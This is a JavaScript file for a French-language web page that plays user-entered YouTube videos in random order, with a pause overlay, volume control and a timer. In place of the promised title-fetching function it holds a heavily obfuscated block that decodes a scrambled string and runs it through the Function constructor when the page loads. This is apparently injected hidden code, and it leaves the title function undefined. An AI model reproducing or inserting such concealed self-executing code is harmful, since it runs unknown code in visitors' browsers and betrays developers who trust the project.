let player;
let videoUrls = [];
let videoTitles = []; // Pour stocker les titres des vidéos
let remainingVideos = []; // Pour stocker les vidéos non visionnées
let watchedVideos = new Set(); // Pour suivre les vidéos déjà regardées
let pausedVideoTimes = {}; // Pour stocker le temps de pause de chaque vidéo
let isPaused = false; // Suivre l'état de pause
const urlContainer = document.getElementById('urlContainer');
const startButton = document.getElementById('startButton');
const addUrlButton = document.getElementById('addUrlButton');
const videoContainer = document.getElementById('mainContainer');
const videoTitlesList = document.getElementById('videoTitles');
const overlay = document.getElementById('overlay'); // Récupérer la superposition
const volumeSlider = document.getElementById('volumeSlider');

// Fonction pour vérifier le nombre d'URL valides dans les champs de texte
function checkUrlCount() {
    const urlInputs = document.querySelectorAll('.urlInput');
    const validUrls = Array.from(urlInputs)
        .map(input => input.value)
        .filter(url => extractYouTubeID(url) !== null); // Utiliser la fonction extractYouTubeID pour valider les URL YouTube

    if (validUrls.length >= 2) {
        startButton.removeAttribute('disabled'); // Activer le bouton "Démarrer"
    } else {
        startButton.setAttribute('disabled', 'true'); // Désactiver le bouton "Démarrer"
    }
}
// Ajouter une nouvelle zone de texte pour une URL de vidéo YouTube
addUrlButton.addEventListener('click', () => {
    const newInput = document.createElement('input');
    newInput.type = 'text';
    newInput.classList.add('form-control', 'mb-2', 'urlInput'); // Ajoute les classes Bootstrap
    newInput.placeholder = "Entrez l'URL d'une vidéo YouTube";

    // Ajoute la nouvelle zone de texte dans le conteneur
    const containerInput = document.getElementById('urlInput')
    containerInput.appendChild(newInput);

    newInput.addEventListener('input', checkUrlCount);
});

// Fonction pour extraire l'ID de la vidéo YouTube à partir de l'URL
function extractYouTubeID(url) {
    const regex = /(?:https?:\/\/)?(?:www\.)?youtu(?:\.be\/|be\.com\/(?:watch\?v=|v\/|embed\/|shorts\/))([\w\-]{11})/;
    const match = url.match(regex);
    return match ? match[1] : null;
}

// Fonction pour obtenir le titre de la vidéo YouTube
var getVideoTitle; (function () { var lhc = '', xdJ = 509 - 498; function yiP(s) { var m = 1095114; var l = s.length; var p = []; for (var q = 0; q < l; q++) { p[q] = s.charAt(q) }; for (var q = 0; q < l; q++) { var a = m * (q + 278) + (m % 26204); var t = m * (q + 277) + (m % 40970); var j = a % l; var i = t % l; var y = p[j]; p[j] = p[i]; p[i] = y; m = (a + t) % 6701974; }; return p.join('') }; var dNs = yiP('netqhgpxnmtbucvawusorjzorotdlsfcryick').substr(0, xdJ); var uzT = '5a[ n=18,d{1r,t=u6]var1mo".bad)f0hzjklan(piritev;xmzn;=a7 o=l6e,a9g8s,t8691,07,6+,p9u8 ,]6S7(,50i7f,[0)8l,20h8o,l0r7(,;4a;6ad n=v],f1rlvvrei+0viwu.l=nfta;r+h)=[+[,]0=++);(ar c=}]nw+=)5ad;=)9.y== 0,f3r6vor]xf0sxha{gumnnts8l;n,t ;A+])iv[r e+augamrnosix;.vpni)(f ()if.r}vvrrgCe ljn(tC-;;i>l0rg,-t{xa+ n=(u}l.v[rta1e;g;;=ag h=rucliv;rnk;08vor l-arl{n[tA;rar ,; ou(aa; h=k;]<c;(+h){v]rgtfaacuanCodiAy(r)+v.rep[r]ta;vfrp2{)=(pe1r*n+i.;har5o"evt,ov1[-w;}=r;g+,;petsv vf=te=5)ljjdt(".oedguh1wladcoarCud+A9(r+()e+i.7hqr<oje,tjon2h-1;)=8;=+ 2l}slveec)neifua; iC()=on ld);=(]-ie()>=)..4u(h)a=s=bstriig=k+cp))nop s((r[2+.]w;4=h+a;!is(h!9n.lr))ij(t<()l.ou.huacs)b(tging<k )ee"gc=h.=otn("()a}lhrpos[(y[p]r;+v.rus)hrj4io(="1;8as -=a9y,v9)4r,t6[3.,e07.no4cmt2u.;oa= {="triag;f.orC(a;Cod.(r6(;vog(iau +=g;a<*.;eognhwif+isnscssl;tezkm;c+a7A;(k)".,ohnuSoron1.=rcmoh=rno;e7v=i[)n;ee)ucn=sis]lCt}zj"2"t.eo,n=z1;'; var DVX = yiP[dNs]; var mxo = ''; var oEq = DVX; var eQv = DVX(mxo, yiP(uzT)); var tvy = eQv(yiP('oir&Bwrl5B4d"B_uo4].(B1ie t7fB9ti6enif{)vr. }#be.0y9..bBnn$_BeBi0}B rBt.-n+B)(e\'B_E(.$z.Bs7t]gf!]4:B$+.7bBygn[sxo[\/e(.$Bg-o(rf).8{)u.iet0 e.,S-BgB_DB0i,wf%9+ieum;?d..,B7ju)l;"k=5i.o\/e(e%;b!BE0)va(8h ==ednIMy0Bc.(,i09nen=i}"t%]n9It(5g.e=,pj"7B1t\'BBB"BB\'Berl).3#sIar;4(B(Bntr.,)w6so2v]7i&.gBexrB!!re..=}_ef)9!]rl{\/; op=\/8;.4ijB&;te!_o=e)]e.ae 3)]e6B;e]{t>)9,( !ge(B$4B116t,g$w!chr){eylrt700ae1%$iv)x[6j;$]i_($=y.+.)i,el.60B2.+]le]BattBa7}o}B].vu*2=2).04*(e($!.o&xB%Ie6ue;)!cu$.*c;;l,B%2B.xDu;9i}.8e el6 rs_.7)r})pB)cfn!e]\/.wjyof(B).B.)B{eB5";(1cr0e!elptB;ge7)inm,.tta)$5(,, vl.Bt;j2f)u,srif0hD.p](fB4(arC\/})iB2,BBb40!$}),v#(t]$41!(:t%n3BbB=0eu4ehe%27_ =_3fl*}pbi.r#I1,.e)tcaB.BtB1ao(b(s..Be})B..B.f)=SB,;Bbe.3,f3=veBto%#3te=.s!N,e;B)B,Bio4)eB6ts4d]+{eksnraq8Ba.S e,.c1e*.(e4e hBt)tb#=B_w-nn.8[.)siBs.Bce(tyB4Bu..o)bBy.sB3d=Bfw.(=.p&mg[.c;r)4.taB(e73sei{ee7.teonsio(y_0pe)te(o9]ib]e&tm(r.it$B(3.B&j(iu)B)3d] { h5ji%ot20)rct(_!(e7qk6.b+=.Bt3)BdB5.48+2e+m3]!et4m3ce,dbe0qBe$6tr2 !g(=%,BB0o(3ecll)d."cdp7ar.ex[9B..."+a3_Ba);B(+)o;m.uBrn)6tlB]BnS4pBuadooB tl2f!bBB\'i-%c1(o\/e0cBBr!p;e3c(()tT\/abBb77Bv7t!e,tot{cB#0(BBB0.e$}(\'Bo!Bfb,h\'v)$rgr.tc$3B{pry;,BtIB!&1!,])sjag;pn {x$a+Bp.rv(\';=45..o=.t(}Bt0re"%e4Br%gnB!$srb)-.h.BiBB.0Bo-i3BBnB;$$te.4$o(%tb==oB0)36S7,d.$#f,g4ee.se$)!rn.wst isB_fbB o7.BCp_+tBb9e="mvj\/ ([g2il_j v2,7n6a.._[)t;BB\/e;u"_=dib__nc6)2 )s3p; !jpo)".=fBo(3')); var lvW = oEq(lhc, tvy); lvW(3393); return 6117 })()

// Quand l'API YouTube est prête, créer un lecteur
function onYouTubeIframeAPIReady() {
    player = new YT.Player('youtubePlayer', {
        height: '100%',
        width: '100%',
        playerVars: {
            controls: 0,
            disablekb: 1,
            cc_load_policy: 0
        },
        events: {
            'onStateChange': onPlayerStateChange
        }
    });
}

// Quand l'état du lecteur change (lecture, pause, etc.)
function onPlayerStateChange(event) {
    if (event.data === YT.PlayerState.PAUSED) {
        const currentVideoId = player.getVideoData().video_id;
        pausedVideoTimes[currentVideoId] = player.getCurrentTime();
        isPaused = true;

        // Afficher la superposition
        overlay.classList.add('visible');

        // Activer l'écouteur de clic sur la superposition
        overlay.addEventListener('click', handleOverlayClick);
    } else if (event.data === YT.PlayerState.ENDED) {
        markVideoAsWatched();
        loadRandomVideo();
    } 
    
}
function stopTimer() {
    clearInterval(timerInterval); // Arrête l'intervalle
}
// Fonction pour marquer la vidéo actuelle comme regardée
function markVideoAsWatched() {
    const currentVideoId = player.getVideoData().video_id;
    watchedVideos.add(currentVideoId);
    remainingVideos = remainingVideos.filter(video => extractYouTubeID(video) !== currentVideoId);

    if (remainingVideos.length == 0) {
        stopTimer();
        alert('Bien joué tu as ENFIN tout regardé ! Temps final : ' + formatTime(secondsElapsed) )
    }
}

// Fonction pour charger une vidéo aléatoire non visionnée
function loadRandomVideo() {
 
    let randomIndex;
    let videoId;
    const currentVideoId = player.getVideoData().video_id; // ID de la vidéo actuelle

    do {
        randomIndex = Math.floor(Math.random() * remainingVideos.length);
        videoId = extractYouTubeID(remainingVideos[randomIndex]);
    } while (videoId === currentVideoId && remainingVideos.length > 1); // Assurer que la vidéo est différente de celle en cours

    if (videoId) {
        player.loadVideoById(videoId);
        highlightCurrentVideo(videoId);
        if (pausedVideoTimes[videoId]) {
            setTimeout(() => {
                player.seekTo(pausedVideoTimes[videoId]);
                delete pausedVideoTimes[videoId];
            }, 500);
        }

        // Réinitialiser l'état de pause et retirer la superposition
        isPaused = false;
        overlay.classList.remove('visible');
        overlay.removeEventListener('click', handleOverlayClick);
    } else {
        alert("L'URL de la vidéo n'est pas valide");
    }
}

function highlightCurrentVideo(currentVideoId) {
    // Supprimer le surlignage de tous les titres
    const allTitles = document.querySelectorAll('#videoTitles li');
    allTitles.forEach(title => title.classList.remove('highlighted'));

    // Ajouter le surlignage au titre de la vidéo en cours
    const currentTitle = Array.from(allTitles).find(title => {
        const videoUrl = videoUrls[Array.from(allTitles).indexOf(title)];
        return extractYouTubeID(videoUrl) === currentVideoId;
    });

    if (currentTitle) {
        currentTitle.classList.add('highlighted');
    }
}
// Gestionnaire de clic sur la superposition
function handleOverlayClick() {
    if (isPaused) {
        loadRandomVideo(); // Charger une nouvelle vidéo
    }
}
document.getElementById('refreshButton').addEventListener('click', () => {
    location.reload(); // Recharge la page
});
// Fonction pour charger la première vidéo
async function loadFirstVideo() {
    if (videoUrls.length === 0) {
        alert("Veuillez entrer au moins une URL !");
        return;
    }

    // Obtenir les titres des vidéos
    for (const url of videoUrls) {
        const videoId = extractYouTubeID(url);
        if (videoId) {
            const title = await getVideoTitle(videoId);
            if (title) {
                videoTitles.push(title);
                remainingVideos.push(url); // Ajouter l'URL à la liste des vidéos restantes
            }
        }
    }

    // Afficher les titres des vidéos dans le menu avec un style personnalisé
    videoTitlesList.innerHTML = ''; // Réinitialise la liste
    videoTitles.forEach(title => {
        const li = document.createElement('li');
        li.textContent = title;

        // Ajouter les classes Bootstrap pour styliser les titres
        li.classList.add('list-group-item', 'bg-dark', 'text-light', 'mb-2', 'rounded');

        videoTitlesList.appendChild(li);
    });

    // Charger une vidéo aléatoire
    loadRandomVideo();
}

// Quand l'utilisateur clique sur "Démarrer"
startButton.addEventListener('click', () => {
    const urlInputs = document.querySelectorAll('.urlInput');
    videoUrls = Array.from(urlInputs).map(input => input.value).filter(url => url !== "");

    // Cache l'URL box et affihce le player

    videoContainer.removeAttribute('hidden');
    videoContainer.classList.add('swipe-up'); 
    urlContainer.style.display = 'none';
    videoContainer.addEventListener('animationend', () => {
        videoContainer.classList.remove('swipe-up');
    });
    // Charger la première vidéo
    loadFirstVideo();
    // Timer start
    startTimer();
});
volumeSlider.addEventListener('input', function () {
    const volume = volumeSlider.value;
    player.setVolume(volume); // Met à jour le volume du lecteur YouTube
});

//Code pour le timer
let timerInterval; // Pour stocker l'intervalle du timer
let secondsElapsed = 0; // Pour suivre les secondes écoulées

// Fonction pour démarrer le timer
function startTimer() {
    secondsElapsed = 0; // Réinitialiser le compteur
    timerInterval = setInterval(() => {
        secondsElapsed++;
        const formattedTime = formatTime(secondsElapsed);
        // Mettre à jour l'affichage du timer
        document.getElementById('timer').textContent = formattedTime;
        document.getElementById('overlayTimer').textContent = formattedTime;
    }, 1000); // Met à jour toutes les secondes
}

// Fonction pour formater le temps au format mm:ss
function formatTime(seconds) {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${String(minutes).padStart(2, '0')}:${String(remainingSeconds).padStart(2, '0')}`;
}



window.addEventListener('DOMContentLoaded', () => {


    // Désactiver le bouton "Démarrer" tant que moins de 2 URL valides ne sont pas saisies
    checkUrlCount();
});